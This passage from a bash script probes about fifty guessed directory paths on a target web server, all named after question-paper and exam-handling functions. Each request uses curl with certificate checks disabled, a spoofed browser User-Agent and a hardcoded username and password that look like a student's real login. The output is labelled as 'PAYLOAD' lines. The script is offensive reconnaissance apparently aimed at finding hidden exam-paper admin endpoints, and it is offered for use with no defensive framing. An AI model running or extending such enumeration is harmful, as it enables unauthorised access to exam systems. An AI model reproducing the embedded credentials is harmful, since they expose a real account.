payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Manager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Manager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Manager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseTransfer/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseTransfer/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseTransfer/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-HandlingModule/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-HandlingModule/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-HandlingModule/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFilePanel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFilePanel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFilePanel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Mgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Mgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Mgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBMassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBMassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBMassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Workflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Workflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Workflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Upload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Upload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Upload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Handling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Handling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Handling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Monitoring/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Monitoring/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Monitoring/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-BatchProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-BatchProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-BatchProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminMassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminMassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminMassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Ops/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Ops/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Ops/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_CloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_CloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_CloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Control/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Mgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Mgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Mgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_AutomationSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_AutomationSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_AutomationSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Dashboard/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Dashboard/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Dashboard/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
